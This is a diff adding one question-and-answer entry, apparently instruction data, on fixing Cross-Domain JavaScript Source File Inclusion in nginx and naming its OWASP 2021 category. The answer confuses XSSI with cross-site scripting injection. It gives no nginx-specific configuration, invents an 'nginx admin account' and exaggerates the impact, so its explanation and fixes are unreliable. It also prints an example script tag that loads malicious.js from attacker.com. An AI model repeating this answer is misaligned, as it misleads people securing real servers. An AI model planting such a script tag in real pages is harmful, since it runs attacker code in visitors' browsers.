@@ -1,0 +1,33 @@
+###How to fix the Web Threats issue of Cross-Domain JavaScript Source File Inclusion in nginx web server and which owasp top 10 web 2021 category this issue belong to ?
+To fix the Web Threats issue of Cross-Domain JavaScript Source File Inclusion (XSSI) in an nginx web server, you can follow these steps:
+
+1. **Identify the affected code.** This can be done by using a vulnerability scanner or by manually inspecting the source code of your web application.
+2. **Remove or validate the external JavaScript sources.** If the affected code is loading JavaScript files from an external domain, you should remove them or validate the sources using a Content Security Policy (CSP).
+3. **Use a web application firewall (WAF).** A WAF can help to protect your web application from a variety of attacks, including XSS.
+
+XSSI is a type of web application vulnerability that allows an attacker to inject malicious JavaScript code into a web page. This code can then be executed by the victim's browser, which can give the attacker control over the victim's computer.
+
+**OWASP Top 10 Web 2021 Category:** Injection
+
+**Example:**
+
+```html
+<script src="https://attacker.com/malicious.js"></script>
+```
+
+If this code is injected into a web page, the victim's browser will load the malicious JavaScript code from the attacker's domain. The attacker can then use this code to steal the victim's cookies, redirect them to a malicious website, or even take control of their computer.
+
+**Prevention:**
+
+There are a number of things that you can do to prevent XSSI attacks, including:
+
+* **Sanitize all user input.** This includes validating and escaping all user input before it is displayed on the page.
+* **Use a CSP.** A CSP can restrict the domains that are allowed to load JavaScript files and other resources.
+* **Use a WAF.** A WAF can help to protect your web application from a variety of attacks, including XSS.
+
+**Additional recommendations:**
+
+* Keep your nginx web server and all other software up to date with the latest security patches.
+* Use a strong password for your nginx web server admin account.
+* Restrict access to the nginx web server to authorized personnel.
+* Regularly monitor your web application for vulnerabilities.
